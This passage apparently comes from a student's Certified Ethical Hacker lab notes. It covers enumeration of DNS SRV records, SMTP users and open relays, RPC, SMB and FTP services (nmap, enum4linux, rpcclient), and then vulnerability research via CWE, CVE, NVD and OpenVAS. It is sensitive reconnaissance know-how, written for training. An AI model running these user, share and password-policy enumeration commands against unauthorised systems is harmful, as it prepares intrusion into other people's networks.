</p><ul id="5ec44965-8f1d-4388-a6aa-d71926b6f5f4" class="toggle"><li><details open=""><summary>Common SRV Record Services</summary><p id="62f0481a-7c06-46f2-b890-cfcb2cfa3d82" class="">Here are some common services that use SRV records:</p><ol type="1" id="33ac2f7a-2ff5-41fe-89d1-e3a798fd2a3b" class="numbered-list" start="1"><li><strong>SIP (Session Initiation Protocol)</strong>:<ul id="8730835a-4a0d-4484-949c-11c458120af7" class="bulleted-list"><li style="list-style-type:disc"><code>_sip._tcp</code>, <code>_sip._udp</code>: Used for VoIP services.</li></ul></li></ol><ol type="1" id="349b10c9-7e3b-4720-a1c8-732bc082a05c" class="numbered-list" start="2"><li><strong>LDAP (Lightweight Directory Access Protocol)</strong>:<ul id="7eac3008-0b86-4087-8b80-8abda4f6be2b" class="bulleted-list"><li style="list-style-type:disc"><code>_ldap._tcp</code>: Used for directory services.</li></ul></li></ol><ol type="1" id="ba77edba-5927-4ad2-8702-16a2555e8d51" class="numbered-list" start="3"><li><strong>Kerberos</strong>:<ul id="27d68471-ae98-4603-919a-244ddf57d902" class="bulleted-list"><li style="list-style-type:disc"><code>_kerberos._tcp</code>, <code>_kerberos._udp</code>: Used for authentication services.</li></ul></li></ol><ol type="1" id="c533e6ee-db0f-4b01-91eb-62b106d21f39" class="numbered-list" start="4"><li><strong>XMPP (Extensible Messaging and Presence Protocol)</strong>:<ul id="3a836461-c28d-43a6-a794-d60f66a02167" class="bulleted-list"><li style="list-style-type:disc"><code>_xmpp-client._tcp</code>, <code>_xmpp-server._tcp</code>: Used for instant messaging services.</li></ul></li></ol><ol type="1" id="563fa51b-e3c9-4541-8f83-f7d88e485e26" class="numbered-list" start="5"><li><strong>IMAP and SMTP (Email Services)</strong>:<ul id="c606be12-e51e-4b1b-b32b-964c1cb38fa0" class="bulleted-list"><li style="list-style-type:disc"><code>_imap._tcp</code>, <code>_smtp._tcp</code>: Used for email retrieval and sending.</li></ul></li></ol><ol type="1" id="76318b3d-6420-4ac8-a8bd-6611a04c7830" class="numbered-list" start="6"><li><strong>Minecraft</strong>:<ul id="90147fee-5786-4d55-8130-f36d25ff3ca2" class="bulleted-list"><li style="list-style-type:disc"><code>_minecraft._tcp</code>: Used for Minecraft game servers</li></ul></li></ol></details></li></ul><ul id="4091f85c-fc81-4d26-b30f-da8c49b71147" class="toggle"><li><details open=""><summary>Simple Script to Find them</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74d25c46-09c6-4068-b7d0-26d5ad2104f3" class="code"><code class="language-Bash">#!/bin/bash
DOMAIN=&quot;example.com&quot;
SERVICES=(&quot;_sip._tcp&quot; &quot;_sip._udp&quot; &quot;_ldap._tcp&quot; &quot;_kerberos._tcp&quot; &quot;_xmpp-client._tcp&quot; &quot;_xmpp-server._tcp&quot; &quot;_imap._tcp&quot; &quot;_smtp._tcp&quot;)

for SERVICE in &quot;${SERVICES[@]}&quot;; do
    echo &quot;Querying SRV record for $SERVICE.$DOMAIN&quot;
    dig &quot;$SERVICE.$DOMAIN&quot; SRV +short
    echo &quot;&quot;
done</code></pre></details></li></ul><p id="81639f04-5230-4a7f-96cf-47d32af25cb4" class="">
</p><p id="f2abd91d-c6e9-48eb-af8d-d6de86cdd21a" class="">
</p></details></li></ul><ul id="f1728dfb-e657-461b-9085-58dc876bd691" class="toggle"><li><details open=""><summary>Why They Are Useful to Hackers</summary><ol type="1" id="7df89726-becf-4653-bd04-cd5c3c691bb3" class="numbered-list" start="1"><li><strong>Service Discovery</strong>:<ul id="279f2199-ebec-4e2b-9dd4-28cca2214b8e" class="bulleted-list"><li style="list-style-type:disc">SRV records can reveal the existence and locations of services within a domain. Hackers can use this information to identify potential targets.</li></ul></li></ol><ol type="1" id="b94ef2ed-4aa4-4a5d-be0b-6d1a7b47245b" class="numbered-list" start="2"><li><strong>Mapping Network Infrastructure</strong>:<ul id="2326d7b6-2b4b-477c-b20d-2cea104d4679" class="bulleted-list"><li style="list-style-type:disc">By enumerating SRV records, a hacker can map the network infrastructure, understanding which services are hosted where.</li></ul></li></ol><ol type="1" id="0e365723-e86b-484c-86a7-f3beedd13997" class="numbered-list" start="3"><li><strong>Targeted Attacks</strong>:<ul id="5d37a2e5-c9f0-4520-b5a3-e20bb3bc648d" class="bulleted-list"><li style="list-style-type:disc">Knowing the exact services and their configurations allows hackers to craft more targeted attacks, such as exploiting known vulnerabilities in specific services.</li></ul></li></ol><ol type="1" id="3cf74726-a72d-4a52-a4fc-f22689659f64" class="numbered-list" start="4"><li><strong>Privilege Escalation</strong>:<ul id="26fd3187-30b1-4669-bb02-28c675671bc2" class="bulleted-list"><li style="list-style-type:disc">Services like Kerberos and LDAP are critical for authentication and directory services. By discovering these, attackers can attempt to exploit them for privilege escalation.</li></ul></li></ol></details></li></ul></li></ul></details></li></ul><p id="33dc9677-15c5-42a5-aaad-45405a64d249" class="">
</p><ul id="4514a013-624f-44ed-9a60-c4c28764693f" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="5762a1c1-6d9d-4fcc-9180-12a5fc775fa9" class="bulleted-list"><li style="list-style-type:disc">LDNS (nlnetlabs.nl)</li></ul><ul id="bb758897-903f-4b3f-a1c2-ed0c77dafc9a" class="bulleted-list"><li style="list-style-type:disc">nsec3map (github)</li></ul><ul id="9d701cca-3986-4a56-a8ae-dce426a81f6c" class="bulleted-list"><li style="list-style-type:disc">nsec3walker (dnscurve.org)</li></ul><ul id="d8bddb26-fc09-4c44-8419-8442e0647d1b" class="bulleted-list"><li style="list-style-type:disc">DNSwalk (github)</li></ul></details></li></ul></details></li></ul><ul id="752d58e0-4708-4f4a-b4b6-bb01cf105cb6" class="toggle"><li><details open=""><summary>SMTP Enumeration</summary><p id="cf7e00c3-2106-4686-a2b7-6a376773091e" class="">SMTP enumeration is performed to obtain a list of valid users, delivery addresses, message recipients on an SMTP server.</p><p id="d3c3c04d-71fb-4bcd-bb58-ecc41e1f1c85" class="">It runs on TCP port 25, 2525, or 587.</p><ul id="ed111f16-5a9c-4a85-b951-edc964e597e0" class="toggle"><li><details open=""><summary>Using Nmap</summary><ul id="d6af34f0-a207-446c-8f3f-305269e11857" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -p 25 --script=smtp-enum-users &lt;target&gt;</strong></code><ul id="b2d5f3cf-a4f3-488f-a40b-e0627d6f81db" class="bulleted-list"><li style="list-style-type:circle">Enumerates users in a target smtp mail server</li></ul><ul id="44a332fb-ce99-4adb-9be5-86d0d95f92f2" class="bulleted-list"><li style="list-style-type:circle">Connects to mail server and tries to use commands like <code>VRFY</code> to find users</li></ul></li></ul><ul id="85af2b28-099c-48a4-adb4-e20fe1ed1547" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -p 25 --script=smtp-open-relay &lt;target&gt;</strong></code><ul id="ece2c6cf-17ce-4bbd-a44e-3b3bf2fdc8e3" class="bulleted-list"><li style="list-style-type:circle">identifies open relays</li></ul><ul id="3ad3db88-51ac-42db-b5ce-2652eea34729" class="toggle"><li><details open=""><summary>What is an Open Relay?</summary><p id="ae5a4fb8-9891-41e7-96bb-b812b0f7bad5" class="">An open relay, also known as an open mail relay or insecure relay, is an SMTP (Simple Mail Transfer Protocol) server that allows anyone on the internet to send email through it, without authentication. This means that the server will accept and forward emails from any sender to any recipient, regardless of the domains involved.</p></details></li></ul><ul id="4dba1b4d-f4d7-45bc-af1e-4a521f8ab443" class="toggle"><li><details open=""><summary>How to Identify an Open Relay</summary><h3 id="c3e4ef3d-7e17-47d4-bd29-a35b650e48c3" class="">Manual Testing with Telnet</h3><p id="a011793d-0a6a-4d46-bc0f-43a8d9c6610d" class="">You can manually test if an SMTP server is an open relay using Telnet:</p><ol type="1" id="a29c7bb3-9d97-4eab-b85d-5692e306cec6" class="numbered-list" start="1"><li><strong>Connect to the SMTP Server</strong>:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="328d39e9-7b1b-488a-b1e1-799e134ed389" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">elnet mail.example.com 25</code></pre></li></ol><ol type="1" id="7fb5a4ec-46bf-4ccb-bea0-941555f5ccd6" class="numbered-list" start="2"><li><strong>Simulate Sending an Email</strong>:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b6e22fb1-d062-4ef7-b346-655123f68fcd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">EHLO example.com
MAIL FROM:&lt;attacker@example.com&gt;
RCPT TO:&lt;victim@anotherdomain.com&gt;
DATA
Subject: Test

This is a test email.
.
QUIT</code></pre></li></ol><ul id="034899b8-5220-4dd7-a4ea-79b6b1f16a73" class="bulleted-list"><li style="list-style-type:disc">If the server accepts and processes the <code>RCPT TO</code> command without error, and ultimately sends the email, it may be an open relay.</li></ul></details></li></ul></li></ul><ul id="00604f61-78c9-4c6d-a84c-01e2fb75568e" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -p 25 --script=smtp-commands &lt;target&gt;</strong></code><ul id="6910ea96-4fdd-43cd-8530-3bd90e1bc948" class="bulleted-list"><li style="list-style-type:circle">identifies what smtp commands are available on the server without login</li></ul></li></ul></details></li></ul></details></li></ul><ul id="979231c0-8f3e-48e1-9e79-ac2448002c9f" class="toggle"><li><details open=""><summary>RPC, SMB and FTP Enumeration</summary><p id="c9e014b9-7367-4496-818a-94193bc09620" class=""><strong>RPC Enumeration</strong>: Enumerating RPC endpoints enables vulnerable services on these service ports to be identified</p><p id="e54df567-2687-4c6b-9936-8cc1207a7402" class=""><strong>SMB Enumeration</strong>: Enumerating SMB services enables banner grabbing, which obtains information such as OS details and versions of services running</p><p id="64284e3f-a3bb-412c-a5a3-10a54d7253e3" class=""><strong>FTP Enumeration</strong>: Enumerating FTP services yields information about port 21 and any running FTP services; this information can be used to launch various attacks such as FTP bounce, FTP brute force, and packet sniffing</p><p id="5e4fe5a9-9b66-42cb-8083-43e80369e399" class="">
</p><ul id="31deec86-5366-4ad4-a9fa-122c945c54f2" class="toggle"><li><details open=""><summary>Using NetScanTools Pro for RPC and SMB</summary><p id="93ee1f6d-a243-4358-9330-86200b5eaf5f" class=""><strong>E:\CEH-Tools\CEHv12 Module 03 Scanning Networks\Scanning Tools\NetScanTools Pro\nstp11demo.exe</strong></p><ul id="79225f64-7f29-4cd5-b519-005030bf0f64" class="toggle"><li><details open=""><summary>First we enabled NFS in Win Server 2019</summary><ul id="865909f9-8614-4344-ae4e-40bc5c758b4d" class="bulleted-list"><li style="list-style-type:disc"><code>Server Manager</code>  → <code>Add roles and features</code></li></ul><ul id="26cd8072-8877-4e8b-95c1-e6926fb85c18" class="bulleted-list"><li style="list-style-type:disc"><code>Server Roles</code> → <code>File and Storave Services</code> → <code>File and iSCSI</code> → <code>Server for NFS</code></li></ul><ul id="6b7d6c48-bf24-4dec-9f77-ea545a65cdcc" class="bulleted-list"><li style="list-style-type:disc"><code>Install</code></li></ul><p id="ace88979-a77d-44f3-ab9c-aa580df2d00f" class="">
</p></details></li></ul><p id="a955a72c-065b-43a1-8fe9-66d248438575" class="">
</p><ul id="850a3c00-f8c9-4470-8624-c57b16bf88b2" class="toggle"><li><details open=""><summary>Find SMB Shares and Names</summary><ul id="e6cd2ba3-3216-4297-9649-8d4362fffd9e" class="bulleted-list"><li style="list-style-type:disc">Manual Tools → SMB Scanner → Start SMB Scanner</li></ul><ul id="9605239f-61b8-4a00-a724-036cd33f5153" class="bulleted-list"><li style="list-style-type:disc">Edit Target List → Input target IP → Add to List → OK</li></ul><ul id="5860777e-24a5-46c6-b293-41157c03076f" class="bulleted-list"><li style="list-style-type:disc">Edit Share Login Credentials → Add list of maybe known creds</li></ul><ul id="c869cc14-2a4f-4602-8f39-afd5ed2b9222" class="bulleted-list"><li style="list-style-type:disc">Click <code>Get SMB Versions</code><ul id="2622542b-c00a-4571-a8f6-7c0c3771892f" class="bulleted-list"><li style="list-style-type:circle">Finds DNS and NetBIOS names</li></ul><ul id="450ddfad-3833-4a07-9687-1971860a9a79" class="bulleted-list"><li style="list-style-type:circle">Could do that without credentials</li></ul><ul id="8a6f1ce9-d73f-4d98-8614-1be8f05bc979" class="bulleted-list"><li style="list-style-type:circle">Right Click on host → View Shares<ul id="9c424f2c-534f-456e-a2c0-3a147815ee43" class="bulleted-list"><li style="list-style-type:square">Couldnt do that without credentials</li></ul></li></ul><p id="cd85b6c7-ab95-438d-9f9b-cfa8c9651d27" class="">
</p></li></ul></details></li></ul><ul id="b58fd754-e8a7-49cb-bd9c-2ad6e7dd4175" class="toggle"><li><details open=""><summary>Find RPC services</summary><ul id="332248eb-dec2-4148-9aaa-c732c8cd027c" class="bulleted-list"><li style="list-style-type:disc">Manual Tools → *nix RPC Info</li></ul><ul id="ea54462a-70b5-4ddd-ad39-1b4cbc81b92f" class="bulleted-list"><li style="list-style-type:disc">Enter IP Address → Click <code>Dump Portmap</code><ul id="5a878104-4267-4410-96ac-f2f2117af812" class="bulleted-list"><li style="list-style-type:circle">It dumps all the available services of RPC and their ports</li></ul></li></ul></details></li></ul></details></li></ul><ul id="6f9023d4-cc79-4af6-9b52-4c26c5b2f7fc" class="toggle"><li><details open=""><summary>Using Nmap for RPC, SMB, FTP</summary><ul id="217a08a9-a104-4b7f-8a56-19b434b41289" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 21 &lt;target&gt;</code><ul id="a124413e-974f-4014-b739-0890c243680b" class="bulleted-list"><li style="list-style-type:circle">to find ftp service</li></ul></li></ul><ul id="9fe8bdfe-0794-488e-be9d-d52bf1352cd1" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -T4 -A &lt;target&gt;</code><ul id="4797b0e3-c509-4250-a08e-8ae8229aa1a9" class="bulleted-list"><li style="list-style-type:circle"><code>-T4</code> timing for stealthiness (multiple params) takes 0-5</li></ul><ul id="fdf601eb-a9ed-4f06-a370-5a510ef922e7" class="bulleted-list"><li style="list-style-type:circle"><code>-A</code> aggressive scan for OS version and script scanning</li></ul><ul id="edaf4a89-643c-4b23-b27b-970ac87e8a50" class="bulleted-list"><li style="list-style-type:circle">will script scan rpc and nfs</li></ul></li></ul><ul id="ea5b9664-e790-4a30-a78d-5567aa85e8d9" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 445 -A &lt;target&gt;</code><ul id="30688f6a-01c9-4f32-91bb-bcb9d0824988" class="bulleted-list"><li style="list-style-type:circle">Script scan smb</li></ul></li></ul><ul id="24596a76-f8fc-4286-883c-7fc28d3e542f" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 21 -A &lt;target&gt;</code><ul id="80649eff-fbe7-4bf2-b573-b407f6606ee4" class="bulleted-list"><li style="list-style-type:circle">script scan ftp</li></ul></li></ul><ul id="a2457f02-e781-46fa-a46b-6e45f2a45cf0" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 445 –-script smb-protocols &lt;target&gt;</code></li></ul><ul id="cf283215-ef9f-4432-b23a-ea2d41303581" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;nmap -p 139 –-script smb-protocols &lt;target&gt;</code></li></ul><ul id="1ebda8bf-f051-48b6-bc91-133f9ef8596f" class="bulleted-list"><li style="list-style-type:disc"><code>use auxiliary/scanner/ftp/ftp_version</code></li></ul><p id="26717af0-901b-4b12-b95e-a6c99fe5fe8f" class="">
</p></details></li></ul></details></li></ul><ul id="fb35a0e8-905f-408f-ac57-36bee65b52cd" class="toggle"><li><details open=""><summary>General scans using Various Enumeration Tools</summary><ul id="87187af6-c9c0-493f-84bd-da472290e8f3" class="toggle"><li><details open=""><summary>Global Network Inventory</summary><p id="8a42e2c4-30d0-429f-b81d-34291df61a1f" class="">This tool does a lot of automated enumeration to find info on the system</p><p id="d8f630f3-f460-46e9-b8b5-fa4f647823a4" class="">But it needs credentials to gain the info, so it can be used after gaining some creds</p><p id="db92647c-319f-437c-9597-2ea0fdc55d51" class="">
</p><ul id="f3638742-559b-4af5-8437-1526981fd197" class="bulleted-list"><li style="list-style-type:disc">New Audit Wizard → Single Address Scan → Enter Address</li></ul><ul id="7db11594-f7f0-43b4-af39-c7b3a35c56bf" class="bulleted-list"><li style="list-style-type:disc">Enter Credentials if available → Leave two checkmarks checked → Finish</li></ul><ul id="368cefe8-ed1e-4631-99b9-506035a95a44" class="bulleted-list"><li style="list-style-type:disc">Tab <code>Scan summary</code> gives some info on name MAC etc</li></ul><ul id="57bb7f61-6bd2-4ef0-9ad3-a93209bd0e9c" class="bulleted-list"><li style="list-style-type:disc">Tab <code>NetBIOS</code> gives info on it</li></ul><ul id="0d75b417-4884-4ae9-aeba-f59312b05ca9" class="bulleted-list"><li style="list-style-type:disc">Info with creds: <code>Operating System</code> <code>User Groups</code> <code>Users</code> <code>Services</code> <code>Installed Software</code> <code>Shares</code> etc.</li></ul></details></li></ul><ul id="99951f94-cb0b-4ca4-9cc8-fe6b89d0c67e" class="toggle"><li><details open=""><summary>Advanced IP Scanner</summary><p id="ec526333-337f-4f25-874a-596790f4d411" class="">You just scan and it finds all info, does a lot of scanning</p><ul id="93aa545d-da30-459b-afe7-3c636bd06de9" class="bulleted-list"><li style="list-style-type:disc">Finds shared folders</li></ul><ul id="31b41027-7d9b-452e-be9b-1a276bc5f0a7" class="bulleted-list"><li style="list-style-type:disc">Find open services</li></ul><ul id="a346a54a-de64-4c27-82b4-8db2ed79af43" class="bulleted-list"><li style="list-style-type:disc">Use Radmin (has to be installed on remote pc) to do various remote operations and remote control</li></ul><p id="9d3b0476-c92c-42b2-add3-c1d45c110a57" class="">
</p></details></li></ul><ul id="a7ddeb09-06a5-44f6-bd81-01376a3b6eaf" class="toggle"><li><details open=""><summary>Using Enum4linux to fin info on Windows and Samba Hosts</summary><ul id="e837661f-9928-43d1-ab94-d732908f7143" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -n &lt;target&gt;</code><ul id="b44cf27e-4038-4b68-9b23-f511e5690bd2" class="bulleted-list"><li style="list-style-type:circle"><code>-n</code> does nmblookup</li></ul><ul id="000055bd-6ff5-49c3-8314-49071cead371" class="bulleted-list"><li style="list-style-type:circle">Looks up netbios information on target</li></ul><ul id="f2105e6d-cc91-4df4-b7a6-c0808c0603ba" class="bulleted-list"><li style="list-style-type:circle">Also checks if it allows sessions using provided username and password</li></ul></li></ul><ul id="36985959-bf30-439d-b15f-7d1370d82bf9" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -U &lt;target&gt;</code><ul id="1bba2305-db0e-4616-bb46-35fdf959be8b" class="bulleted-list"><li style="list-style-type:circle"><code>-U</code> gets the list of users through smb request</li></ul><ul id="dc9492a5-8e27-4e72-9b78-4647c99da9b8" class="bulleted-list"><li style="list-style-type:circle">also works without the user sometimes<ul id="379e5c1a-b6c2-4e48-a362-c8c0f4da5ccf" class="bulleted-list"><li style="list-style-type:square">Nmap equivalent:  <code>map --script smb-enum-users -p 445 &lt;target&gt;</code></li></ul><ul id="af16f373-fad3-4f59-bf5b-0206414d140d" class="bulleted-list"><li style="list-style-type:square">Manually: <ul id="35be64ba-08eb-43c5-969c-5332afce7e24" class="bulleted-list"><li style="list-style-type:disc"><code>rpcclient -U “%” &lt;target&gt;</code> → <code>enumdomusers</code> → <code>queryuser &lt;rid&gt;</code></li></ul><ul id="24c87ad1-e32e-4a8b-aaaf-7bd1f3a51386" class="bulleted-list"><li style="list-style-type:disc">or <code>rpcclient -U &quot;&quot; -N &lt;target&gt;</code></li></ul></li></ul></li></ul></li></ul><ul id="e5520b0c-da11-469b-ae35-e1204a32155e" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -o &lt;target&gt;</code><ul id="e28ca266-911d-44d6-8252-2ddc0d74506c" class="bulleted-list"><li style="list-style-type:circle"><code>-o</code> get OS information</li></ul><ul id="0e03dcbf-25c2-430d-8138-f046d64977bf" class="bulleted-list"><li style="list-style-type:circle">might also work without the user</li></ul></li></ul><ul id="4f23a601-c6c7-43e0-9da6-eccd596f02e0" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -P &lt;target&gt;</code><ul id="94ffaa09-201f-4b55-a6bb-f0f67de32c49" class="bulleted-list"><li style="list-style-type:circle"><code>-P</code> retrieves password policy information</li></ul><ul id="53794258-f7a9-4d2d-b2e5-906f17c4f5f3" class="bulleted-list"><li style="list-style-type:circle">might also work without the user</li></ul></li></ul><ul id="c45f2319-8d95-4826-8dd8-86454f047e2c" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -G &lt;target&gt;</code><ul id="06311651-1469-46ea-a157-4e04959e5187" class="bulleted-list"><li style="list-style-type:circle"><code>-G</code> retrieves group policy and members list</li></ul><ul id="7990d08a-a52a-4306-84d2-d1315562554d" class="bulleted-list"><li style="list-style-type:circle">might also work without the user</li></ul></li></ul><ul id="8f74df94-97b2-4ac0-a724-9a32048fccde" class="bulleted-list"><li style="list-style-type:disc"><code>enum4linux -u &lt;user&gt; -p &lt;pass&gt; -S &lt;target&gt;</code><ul id="2fdbdb4b-e632-45bd-afb6-538b73cc5627" class="bulleted-list"><li style="list-style-type:circle"><code>-S</code> retrieves the shares list</li></ul><ul id="d8d5eb12-48cc-463e-b843-dc641a44e03a" class="bulleted-list"><li style="list-style-type:circle">might also work without user if appropriate permissions are let</li></ul><p id="9543e296-29e6-4b8f-aba8-21bbead3dde8" class="">
</p></li></ul></details></li></ul></details></li></ul><p id="bef62b12-52a8-41c8-8c6e-df4536ae9baf" class=""><div class="indented"><p id="fa5ce229-3171-4871-b091-1f937dd0a78d" class="">
</p></div></p></details></li></ul><ul id="0ac9feb5-a0a5-4f7d-8982-b5a93a3906d7" class="toggle"><li><details open=""><summary>Lab 4 - Vulnerability Analysis</summary><p id="b1c9e043-0763-4694-9da9-9a68be9644e1" class="">Vulnerability assessments scan networks for known security weaknesses: <div class="indented"><p id="ac1f052c-ad5f-4733-9105-d5f0acaa2de5" class="">it recognizes, measures, and classifies security vulnerabilities in a computer system, network, and communication channel;</p><p id="113a767e-2d03-4d55-a9cf-3c92d82124db" class="">and evaluates the target systems for vulnerabilities such as missing patches, unnecessary services, weak authentication, and weak encryption. </p></div></p><p id="d680564e-242e-45ba-b55a-b020dff89933" class="">The information gleaned from a vulnerability assessment helps you to identify weaknesses that could be exploited and predict the effectiveness of additional security measures in protecting information resources from attack.</p><p id="bc91027d-c043-43b7-9a22-4703b5ca7a1c" class="">
</p><ul id="01559782-6b1e-4c1d-9f9a-d6a6f27e54d8" class="toggle"><li><details open=""><summary>Vulnerability Research using Common Weakness Enumeration (CWE)</summary><ul id="20150ce5-bf1f-4049-bd59-80af9001f59d" class="bulleted-list"><li style="list-style-type:disc">Go to https://cwe.mitre.org</li></ul><ul id="da237fe7-7a27-4af8-9dc6-11a154998738" class="bulleted-list"><li style="list-style-type:disc">Click on the Search tab → Search SMB → Click any CWE (Clicked 284)<ul id="0384b9dc-5118-4c04-bd20-79ca369e7db3" class="bulleted-list"><li style="list-style-type:circle">Shows detailed information</li></ul></li></ul><ul id="3880c52c-bd0b-4115-b992-837a74cffb74" class="bulleted-list"><li style="list-style-type:disc">Click on CWE List → CWE Top 25 → Relationships section<ul id="866f4c61-1262-46dc-952c-0e1727391edb" class="bulleted-list"><li style="list-style-type:circle">This information can be used to exploit the vulnerabilities in the software and further launch attacks.</li></ul></li></ul><p id="f1530154-b0db-48bd-8831-817c5ef53c32" class="">
</p></details></li></ul><ul id="0ca85d6e-f43a-4740-b214-ec3d7a5a2b19" class="toggle"><li><details open=""><summary>Vulnerability Research using Common Vulnerabilities Exposures (CVE)</summary><p id="3295dd28-dbd7-4f28-ab67-26f772973d8d" class="">It is used to discuss or share information about a unique software or firmware vulnerability, provides a baseline for tool evaluation</p><p id="95ffcb54-c8e5-46e3-89df-41a8d81d7995" class="">
</p><ul id="b5be057c-bfd9-4c5a-8243-e63ef7062a7f" class="bulleted-list"><li style="list-style-type:disc">Go to https://cve.mitre.org</li></ul><ul id="61b384d7-3868-4cfb-b15b-760ce323cdaa" class="bulleted-list"><li style="list-style-type:disc">Click Search CVE → Find any vulnerability and see its information<ul id="7457077f-1793-4118-b368-d02c7f3ccbc1" class="bulleted-list"><li style="list-style-type:circle">It has info such as <strong>Description</strong>, <strong>References</strong>, and <strong>Date Record Created</strong></li></ul></li></ul><p id="5536f739-ee37-49ce-a229-1adbf3a11529" class="">
</p></details></li></ul><ul id="d412dbbf-7f63-47da-a028-1d4839282d19" class="toggle"><li><details open=""><summary>Vulnerability Research using National Vulnerability Database (NVD)</summary><p id="50382f9d-b2de-4d96-8bdb-28bcba69e62d" class="">The National Vulnerability Database (NVD) is the U.S. government repository of standards-based vulnerability management data represented using the Security Content Automation Protocol (SCAP).</p><p id="e24b3c79-837d-4237-b37f-3ea12ac04d4f" class="">
</p><ul id="4946ac30-7628-4008-a6b3-b136ca4fe621" class="bulleted-list"><li style="list-style-type:disc">Go to https://nvd.nist.gov</li></ul><ul id="273c00c8-1aee-4d67-ac31-6b10b03309a6" class="bulleted-list"><li style="list-style-type:disc">Search → Vulnerabilities - CVE <ul id="8779e3b8-0bcf-40f7-a545-abb0cd1e7a67" class="bulleted-list"><li style="list-style-type:circle">Shows info such as <strong>Current Description, Severity, References</strong>, and <strong>Weakness Enumeration</strong></li></ul><p id="5b144dea-9d8e-4b2a-b7ab-20d778993ed5" class="">
</p></li></ul><p id="9cc52fa6-090e-4d3b-8e8a-11c590d126d5" class="">
</p></details></li></ul><ul id="566c9a1f-aa05-447c-b7c1-f01cf6218576" class="toggle"><li><details open=""><summary>Vulnerability Assessment using OpenVAS</summary><p id="7602e514-cd02-4450-9866-eb26b4c8f51b" class="">OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. </p><p id="c3bcb15c-133b-4129-8234-4f30125c8a02" class="">The challenge with vulnerability scanners is that they are quite limited; they work well for an internal or white box test only if the credentials are known.</p><ul id="fdcdbeff-6f99-420c-9096-b301b8d06827" class="toggle"><li><details open=""><summary>Its capabilities include:</summary><p id="b8b8930d-6f59-40ff-b65c-688f5b9a94df" class="">unauthenticated testing</p><p id="a43a588e-a832-4aa6-aa2d-c4b39b374b57" class="">authenticated testing</p><p id="802b36a5-fbd2-4796-b7d8-e97dcaf8c6a2" class="">various high level and low-level Internet and industrial protocols</p><p id="1ff1dcbe-c58f-478d-8618-15630cf5725d" class="">performance tuning for large-scale scans</p><p id="ccb8d755-62a0-40c4-814b-35f54bd9cb1a" class="">a powerful internal programming language to implement any vulnerability test.</p><p id="64feb64c-95cc-467a-b76f-28d435b5868d" class="">The actual security scanner is accompanied with a regularly updated feed of Network Vulnerability Tests (NVTs)—over 50,000 in total.</p><p id="18d33f5d-341a-4274-bd8a-676532371879" class="">
</p><p id="95753b3c-d0e4-4b56-8127-f0bbdc2bc146" class="">
</p></details></li></ul><p id="a9cdfb3f-4f73-4b0d-8b44-0e13e91272b0" class="">
